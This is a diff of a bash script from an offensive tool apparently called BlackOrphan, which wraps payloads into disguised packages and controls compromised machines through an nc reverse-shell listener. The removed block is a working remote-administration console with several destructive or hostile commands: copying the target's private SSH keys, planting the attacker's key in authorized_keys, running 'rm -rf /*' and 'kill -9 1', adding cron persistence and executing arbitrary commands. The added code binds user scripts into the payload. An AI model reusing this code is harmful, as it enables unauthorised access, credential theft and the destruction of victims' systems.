@@ -43,8 +43,8 @@ is_root() {
     }
 }
 header() {
-    #reset
-   cat <<"EOF"
+    reset
+    <<'EOF'
 
  ____  _            _     ___             _
 | __ )| | __ _  ___| | __/ _ \ _ __ _ __ | |__   __ _ _ __
@@ -98,320 +98,7 @@ source misc/rpmpackage.sh
 source misc/petpackage.sh
 source misc/pkgpackage.sh
 
-bCommand(){
-    shopt -s nocasematch
-    while printf "[reverseShell:BlackOrphan]: "; read own3d deta
-    do
-	case $own3d in
-	    "")  echo "${open}${bold}${red}Type help if you don't know what to do${close}"
-		 continue
-		 ;;
-	    help)
 
-		printf "HELP COMMANDS\n\n"
-		printf "\tinfo [COMMAND]\tSHOWS YOU A SHORT INFORMATION ABOUT A COMMAND\n\n"
-		printf "\thelp [COMMAND]\tTYPING ONLY 'help' SHOWS YOU THIS BABY,TYPING HELP WITH A COMMAND SHOWS YOU HOW TO USE A COMMAND\n\n"
-
-		printf "NETWORK COMMANDS\n"
-		printf "\tifconfig\tSHOWS WHAT THE NORMAL IFCONFIG COMMAND WILL SHOW ON A LINUX BOX\n\n"
-
-		printf "RUN SH.T\n\n"
-		printf "\tremove_sys\tREMOVES EVERYTHING ON THE SYSTEM\n\n"
-		printf "\tget_ssh\t\tGET'S THE SHH PUB-KEY AND PRIV-KEY\n\n"
-		printf "\tput_ssh\t\tPUT YOUR SSH KEYS ON THE TARGET authroized_keys\n\n"
-        printf "\tlogin_ssh\t\LOGIN TO TARGETS WITH SSH, YOU MUST RUN PUT_SSH BEFORE THIS\n\n"
-		printf "\tkill_all\tKILLS ALL PROCESS ON THE TARGETS COMPUTERS\n\n"
-		printf "\tpersistent\tONE'S THE TARGET BOOTS UP, YOU CAN CONNECT\n\n"
-		printf "\tdrop_shell\t\tGives you a shell access on the target box\n\n"
-
-		printf "ABOUT TARGET\n\n"
-		printf "\tsysinfo\t\tSHOWS YOU INFORMATION ABOUT THE TARGET\n\n"
-		printf "\tprocess\t\tSHOWS ALL PROCESS RUNNING ON TARGETS COMPUTER\n"
-		printf "\tsystem\t\tRUNS THE SPECIFIED ARGUMENT ON THE TARGETS COMPUTER\n"
-
-		;;
-	    info)
-		case $deta in
-		    "") echo "${open}${bold}${yellow}[!]Info What${close}"
-			continue
-
-			;;
-		    ifconfig) echo "TYPING ONLY 'ifconfig' WILL OUTPUT WHAT THE NORMAL IFCONFIG COMMAND WILL OUPUT ON A LINUX BOX"
-			      continue;;
-		    sysinfo) echo "TYPING 'sysinfo' WILL OUTPUT the [IPADDRESS, CURRENTUSER, HOSTNAME, UNAME]"
-			     continue ;;
-		    drop_shell) echo "TYPING 'drop_shell' WILL GIVE YOU A DIRECT SHELL ACCESS TO THE LINUX BOX"
-				continue;;
-		    persistent) echo "TYPING 'persistent' WILL CREATE A CRONJOB FOR BLACKORPHAN"
-				continue;;
-		    put_ssh) echo "TYPING 'put_ssh' PUTS YOUR PUBLIC SSH KEY ON THE TARGETS AUTHROIZED_KEYS"
-			     continue ;;
-		    get_ssh) echo "TYPING 'get_ssh' SAVES THE TARGET PUBLIC KEYS AND PRIVTATE KEY IN \
-\nROOTPRIVKEY AND ROOTPUBKEY FOR ROOT USER, FOR NONE ROOT USERS IT SAVES IN PUBKEY.TXT AND PRIVKEY.TXT"
-			     continue ;;
-            login_ssh) echo "TYPING 'login_ssh' CREATE AN SSH SECTION TO THE TARGET" 
-                continue ;;
-		    info) echo "TYPING 'info' SHOWS THE INFORMATION ABOUT A COMMAND "
-			  continue ;;
-		    process) echo "TYPING 'process' SHOWS ALL THE RUNNING PROCESS IN THE TARGETS COMPUTER "
-			     continue ;;
-		    help) echo "TYPING 'help' SHOWS YOU HOW TO USE THE COMMANDS"
-			  continue ;;
-		    kill_all) echo "TYPING 'kill_all' KILLS ALL PROCESS IN THE TARGETS COMPUTER"
-			      continue ;;
-		    remove_sys) echo "TYPING 'remove_sys' RUNS RM -RF / ON THE TARGETS COMPUTER"
-				continue ;;
-		    exit) echo "TYPING 'exit' CLOSE THE CONNECTION"
-			  continue ;;
-		    system) echo "TYPING 'system' AND AN ARGUMENT ( VALID COMMAND ) RUNS THE COMMAND ON THE TARGETS BOX"
-			    continue ;;
-		    clear) echo "TYPING 'clear' CLEARS THE SCREEN"
-			   continue ;;
-		    
-		    
-		    *) echo "${open}${bold}${red}I don't understand that option ${close}"
-		       continue ;;
-		esac
-		;;
-
-	    ifconfig)
-		echo "ifconfig" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
-		;;
-	    sysinfo) sysipaddress=$(echo "ip route" |\
-					   timeout --foreground --signal=TERM .9  nc -lnvp "$l_port" 2>/dev/null|\
-					   sed 's/src/\nsrc/' | grep src | egrep -m 1 -o "[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}")
-
-		     sysuser=$(echo "whoami" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null)
-		     syshostname=$(echo "hostname" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null)
-		     sysuname=$(echo "uname -srv" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null)
-		     echo "IPADDRESS: - ${sysipaddress}"
-		     echo "USER:- ${sysuser}"
-		     echo "HOSTNAME:- ${syshostname}"
-		     echo "UNAME:- ${sysuname}"
-		     ;;
-	    process) echo "ps aux" | timeout --foreground --signal=TERM .9  nc -lnvp "$l_port" 2>/dev/null
-		     continue
-		     ;;
-	    kill_all) echo "kill -9 1" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
-		      continue
-		      ;;
-	    get_ssh)
-		get_sshUser=$(echo "whoami" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null)
-		get_sshfunc(){
-
-		    local chicken=$(echo "ls /home/${get_sshUser}/.ssh/*.pub" | \
-					   timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| grep .pub$)
-
-		    echo "cat ${chicken}" | \
-			timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| tee -a pubkeys.txt
-
-
-		    echo "cat ${chicken%.*}" | \
-			timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| tee -a privkeys.txt
-
-		    printf "\n\n${open}${bold}${green}ssh keys has been copied to pubkeys.txt and privkeys.txt${close}\n"
-		}
-		get_sshfunc2(){
-		    local theWalkingDead=$(echo "ls /root/.ssh/*.pub" | \
-						  timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| grep .pub$)
-
-		    echo "cat ${theWalkingDead}" | \
-			timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| tee -a rootpubkeys.txt
-
-		    echo "cat ${theWalkingDead%.*}" | \
-			timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| tee -a rootprivkeys.txt
-
-		    echo "\n\n${open}${bold}${green}ssh keys has been copied to rootpubkeys and rootprivkeys.txt${close}\n"
-		}
-
-
-
-		if test "${get_sshUser}" == "root";then
-
-		    if echo "ls -a /root/ " |\
-                            timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| grep ^.ssh &>/dev/null;then
-
-			get_sshfunc2;
-
-		    else
-			echo "ssh keys not found"
-			echo "generation ssh keys on target machine"
-			echo "ssh-keygen -N '' -f /root/.ssh/${get_sshUser}" | \
-                            timeout --foreground --signal=TERM 6s nc -lnvp "$l_port" 2>/dev/null
-			get_sshfunc2;
-		    fi
-		else
-		    if echo "ls -a /home/${get_sshUser}" |\
-			    timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| grep ^.ssh &>/dev/null;then
-                
-			get_sshfunc;
-
-		    else
-			echo "${open}${bold}${yellow}ssh keys not found${close}" 
-			echo "${open}${bold}${green}Creating ssh keys ${close}"
-			timeout --foreground --signal=TERM 6s nc -lnvp "$l_port" 2>/dev/null
-			echo "ssh-keygen -N '' -f /home/${get_sshUser}/.ssh/${get_sshUser}" | \
-                            timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
-			get_sshfunc;
-		    fi
-		fi
-		continue
-		;;
-	    put_ssh)
-		declare -g put_sshIp=$(echo "ip route" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null| \
-				   sed 's/src/\nsrc/' | grep src | egrep -m 1 -o "[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}")
-		declare -g put_sshUser=$(echo "whoami" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null)
-		login_ssh(){
-		    shopt -s nocasematch
-		    while printf "Establish an ssh Session:[y|n] " ; read estherBlish junk
-		    do
-			case $estherBlish in
-			    "") echo "${open}${bold}${red}Nothing was inputed${close}" ; continue ;;
-			    y)
-				echo "${open}${bold}${green}If put_ssh worked properly you won't be asked for a password${close}"
-				sleep 3s
-				xterm -title "BlackOprphan ssh Session" -e /bin/bash -c "ssh ${put_sshUser}@${put_sshIp}"
-				break ;;
-			    n)  break ;;
-			esac
-		    done
-
-		}
-
-		while printf "location of your public ssh key: " ; read sandwhich
-		do
-		    if [ -z "${sandwhich}" ];then
-			echo "${open}${bold}${red}An input is required${close}"
-			continue
-		    else
-			if ! file ${sandwhich} | grep 'public key' &>/dev/null;then
-			    echo "${open}${bold}${red}This is not a valid pub ssh file${close}"
-			    continue
-			else
-			    pubsshkey=$(<"${sandwhich}")
-			    echo "${open}${bold}${green}Adding Your pub ssh key to authroized_keys of target"
-			    if test "${put_sshUser}" == "root";then
-				echo "eval echo ${pubsshkey} >> /root/.ssh/authorized_keys" | \
-                                    timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
-				echo "${open}${bold}${green}SSH KEYS HAS BEEN COPIED ${close}"
-				login_ssh;
-				continue 2
-
-			    else
-				echo "eval echo ${pubsshkey} >> /home/${put_sshUser}/.ssh/authorized_keys" |\
-                                    timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
-				echo "${open}${bold}${green}SSH KEYS HAS BEEN COPIED ${close}"
-				login_ssh;
-				continue 2;
-			    fi
-			fi
-
-		    fi
-		done
-		;;
-        login_ssh)
-            {
-                [[ ${put_sshIp} == "" ]] || [[ ${put_sshUser} == "" ]]
-            } && {
-                echo "${open}${bold}${red}Run put_ssh ${close}"
-            }  || {
-                xterm -title "BlackOprphan ssh Session" -e /bin/bash -c "ssh ${put_sshUser}@${put_sshIp}"
-            }
-        ;;
-	    remove_sys)
-		echo "rm -rf /*" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
-		continue
-		;;
-	    persistent)
-		cronJ=$(echo "${0}" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null\
-                               | grep ^ | awk -F ":" '{ print $1}')
-		echo "${open}${bold}${green}Creating a cron file ${cronJ}${close}"
-		sleep 2
-		echo "eval echo '\'*\' \'*\' \'*\' \'*\' \'*\' root \'bash\' ${cronJ}' > ~/cronJobs" | \
-                    timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
-		
-		echo "${open}${bold}${green}Done${close}"
-		echo "${open}${bold}${green}Installing the CronFile${close}"
-		echo "crontab cronJobs" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
-		echo "${open}${bold}${green}Done${close}"
-		echo "${open}${bold}${green}Cleaning UP${close}"
-		echo "rm cronJobs" | timeout --foreground --signal=TERM .9 nc -lnvp "$l_port" 2>/dev/null
-		echo "${open}${bold}${green}Done${close}"
-		continue
-		;;
-		clear) clear;;
-		system)
-				if [ -z "${deta}" ];then
-					printf "\n${open}${bold}${red}what system command do you want to run ?${close}\n"
-				else
-					echo "${deta}" | \
-							timeout --foreground --signal=TERM .9  nc -lnvp "$l_port" 2>/dev/null
-				fi
-		;;
-	    drop_shell) break;;
-	    exit) exit;;
-	    *) echo "${open}${bold}${red}I don't know this command${close}"
-	       ;;
-	esac
-
-    done
-
-
-
-}
-##BOX3D FUNCTION
-box3d(){
-    ##WHEN THE BOX3D FUNCTION IS CALLED, IT SHOULD CHECK IF THERE IS CONNECTION
-    ##IF THERE IS NO CONNECTION RETRY AGAIN, UNTIL CONNECTION IS ESTABLISHED
-
-    local reg="[yY]"
-    printf "${open}${light}${green}Start the Listener now [yY|nN]:${close} " ; read  $opt -e startL
-
-    [[ ${startL} =~ ${reg} ]] || \
-	{
-	    reset ;  _select
-	}
-
-    reset
-    echo "${open}${light}${yellow}[!]Please Wait for Connection to be Established${close}"
-    while :
-    do
-	timeout .1 nc -lnvp "$l_port" > "/tmp/${0##*/}.${SPID}" 2>&1
-	grep -E "connect|accepted" "/tmp/${0##*/}.${SPID}" >/dev/null 2>&1
-	if [ $? != 0 ];then
-
-	    printf "${open}${light}${yellow}[!]Connection Not Yet Established${close}\n"
-
-	    printf "${open}${light}${red}Retrying${new}${close}"
-
-	    sleep 2
-
-	    reset
-
-	    continue
-
-	fi
-
-	break
-    done
-
-    rm "/tmp/${0##*/}.${SPID}" >/dev/null 2>&1
-    printf "${open}${light}${green}Connection Established${close}\n"
-    echo $'\a'
-    bCommand;
-    if [ "$( which socat )" ];then
-
-	socat - tcp-l:"$l_port",reuseaddr,fork
-
-    elif [ "$( which nc )" ];then
-
-	nc -lvp "$l_port"
-
-    fi
-    reset
-    header
-
-}
 ###CREATE SERVER BANNER FUNCTION
 createserver_banner(){
     header;
@@ -444,7 +131,8 @@ _select(){
 		    isInteger "$l_port"
 		    status=$?
 		    (( status != 0 )) && {
-			printf "%s\n" "$l_port is not a valid port number"
+			printf "${open}${bold}${red}%s${close} \n" "$l_port is not a valid port number"
+			continue
 		    }
 		    # if port is null continue the loop, if a port number was not specified ,
 		    #if an invalid port number was specified rerun the loop
@@ -458,16 +146,14 @@ _select(){
 
 	    3)
 		about && main_menu ;;
-
-	    q)	printf "\n${open}${light}${yellow}Have a good boring life :)${close}\n" && exit $RANDOM ;;
+	    
+	    q)  exit 2;;
 
 	    *)
 		reset
 		main_menu
 
 		printf "\n${open}${light}${yellow}[!]Invalid Selection <%s>${close}\n" "$selct"
-
-
 		;;
 	esac
 
@@ -477,28 +163,32 @@ _select(){
 
 chk_file() {
     # Crypt the script
-    
+    local fileExt
     source ${CRYPT}/misc/crypt.sh
-    while printf "\n${open}${light}${green}Specify the script to bind with: ${close}" ; read bindscript
-    do
-	if [ -z "$bindscript" ];then
-	    printf "\n${open}${light}${yellow}[!]Path to the script to bind with is needed${close}\n"
+    source ${CRYPT}/misc/scriptconfig.sh
+    while :;do
+
+	printf "${open}${bold}${green}Specify script to bind with: ${close}" ; read -e bindscript
+	printf "\n"
+	if [[ -z "$bindscript" ]];then
+	    printf "${open}${bold}${red}%s${close}\n" "[!]Specify absolute Path to Script to bind with"
 	    continue
 	fi
 	
-	if [ ! -e "${bindscript}" ];then
-	    printf "\n${open}${light}${red}${bindscript}Does not exist${close}\n"
+	if [[ ! -e "${bindscript}" ]];then
+	    printf "${open}${bold}${red}${bindscript} %s${close}\n" "Does not exist"
 	    continue
-	elif [ ! -f "${bindscript}" ];then
-	    printf "\n${open}${light}${red}%s Is not a file${close}\n" "${bindscript}"
+	elif [[ ! -f "${bindscript}" ]];then
+	    printf "${open}${bold}${red}%s${close}\n" "${bindscript} Is not a file"
 	    continue
 	fi
 	
 	env='#!'"$(which env)"
-	deadArray=("$(which bash)" "$(which dash)" "$(which ksh)" "$(which sh)" "$(which rbash)" "$(which tmux)" "$(which tcsh)" "$(which perl)" "$(which python)" )
-	#####################################################################################################################
+	declare -a bangArray=("$(which bash)" "$(which dash)" "$(which ksh)" "$(which sh)" "$(which rbash)" "$(which tmux)" "$(which tcsh)" "$(which perl)" "$(which python)" )
+
 	
-	for i in "${deadArray[@]}"
+	
+	for i in "${bangArray[@]}"
 	do
 	    #echo "#!${i}" > /dev/null 2>&1
 	    head -1 "${bindscript}" | egrep -qo "#\!$i|$env.$i" #>/dev/null 2>&1
@@ -508,74 +198,28 @@ chk_file() {
 	    
 	done
 	
-	#########################LONG LINE,I HAD TO CUT IT SHORT#######################
-	printf \
-	    "${open}${bold}${yellow}%s${close}\n" \
-	    "[!]Please put a shebang/hashbang at the beginning of the script you specified and try again"
 	
+	printf "${open}${bold}${red}%s${close}\n" "Hash bang is required in ${bindscript##*/}"
+
 	
 	cd ../../../../ && rm -rf "$dirfile"
+	
 	exit 2
 	
     done
     
-    echo ""
-    getLast=${bindscript##*.}
+    fileExt=${bindscript##*.} ;# get the file extension
+
+    cp "${bindscript}" "$(pwd)" 
     
-    cp "${bindscript}" "$(pwd)"
-    
-    CUT_=${bindscript##*/}
-    
-    CUT_IT=${CUT_%.*}
-    
-    mv "${CUT_}" "${CUT_IT}"
-    
-    python_perl_regex() {
-	# the argument should be valid interpreter name
-	# for example : python_perl_regex "python"
-	# This function will strip of the "the full hashbang"
-	local regex="$1"
-	
-	[[ -z "$regex" ]] && {
-	    printf "%s\n" "Null arguments are not allowed"
-	    exit 1
-	}
-	
-	cat "${CUT_IT}" >> "${dirfile}"
-	sed -i "s/^#\!.*$(echo "${regex}")//g" "${dirfile}" #Striping off intereperter
-	echo "!" >> "${dirfile}"
-	cat "${dirfile}" >> "${CUT_IT}"
-	mv "${dirfile}" "${CUT_IT}"
-	chown root:root ./*
-	chmod 775 ./*
-    }
-    
-    # The CRYPT variable passed to the crypt function , contains the PWD where blackorphan was executed from
-    # getLast variable contains the extension name of the specified script to bind to
-    case "${getLast}" in
-	sh)
-	    _sh
-	    cat "${CUT_IT}" >> "${dirfile}"
-	    mv "${dirfile}" "${CUT_IT}"
-	    chown root:root ./*
-	    chmod 775 ./*
-	    crypt "shell script" "${CRYPT}"
-	    sleep 2
-	    
-	    ;;
-	py)
-	    _py
-	    python_perl_regex "python"
-	    crypt "python script" "${CRYPT}"
-	    ;;
-	pl)
-	    _pl
-	    python_perl_regex "perl"
-	    crypt "perl script" "${CRYPT}"
-	    ;;
-    esac
-    
-    
+    fileName=${bindscript%%.*}
+    fileName=${fileName##*/}
+
+    echo "${fileName}"
+    mv "${bindscript}" "${fileName}"
+
+    scrConfig "${fileExt}"
+
 }
 
 replay(){
@@ -622,6 +266,7 @@ general(){
 	status=$?
 	(( status != 0 )) && {
 	    printf "%s\n" "$l_port is not a valid port number"
+	    continue ;
 	}
 	
 	printf "${open}${light}${yellow}[!]LHOST: %s\n" "$l_ip"
@@ -637,8 +282,7 @@ packagedetails(){
 	   "${pPackage}"
 
     
-    while :
-    do
+    while :;do
        read -ep "Email Address: [dev@devloper.com]: " email
        if [[ -z "$email" ]];then
 	   email="dev@developer.com"
@@ -646,8 +290,7 @@ packagedetails(){
        fi
     done
     
-    while :
-    do
+    while :;do
 	read -ep "Enter Description: [incredible application]: " description
 	if [[ -z "$description" ]];then
 	    description="incredible application"
@@ -655,8 +298,7 @@ packagedetails(){
 	fi
     done
 
-    while :
-    do
+    while :;do
 	read -ep "Enter Version Number: [0.1]: " vnumber
 	echo ""
 	if [[ -z "$vnumber" ]];then
